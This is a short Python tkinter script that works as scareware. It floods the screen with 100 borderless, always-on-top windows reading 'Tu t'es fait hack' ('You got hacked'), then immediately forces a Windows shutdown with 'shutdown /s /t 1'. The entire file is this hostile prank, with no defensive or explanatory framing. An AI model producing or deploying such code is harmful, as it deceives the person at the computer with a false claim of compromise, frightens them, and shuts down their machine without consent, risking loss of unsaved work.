from random import randint
from tkinter import *
import time
import threading
import os

root = Tk()
root.attributes("-alpha", 0)
root.overrideredirect(1)
root.attributes("-topmost", 1)

def placewindows():
    for i in range(100
                   ):
        win = Toplevel(root)
        win.geometry("300x60+" + str(randint(0, root.winfo_screenwidth() - 300)) + "+" + str(randint(0, root.winfo_screenheight()-60)))
        win.overrideredirect(1)
        Label(win, text="Tu t'es fait hack", fg="red").place(relx=.38, rely=.3)
        win.lift()
        win.attributes("-topmost", True)
        win.attributes("-topmost", False)
        root.lift()
        win.attributes("-topmost", True)
        win.attributes("-topmost", False)
        time.sleep(0.05)
    os.system("shutdown /s /t 1")
    

threading.Thread(target=placewindows).start()

root.mainloop()
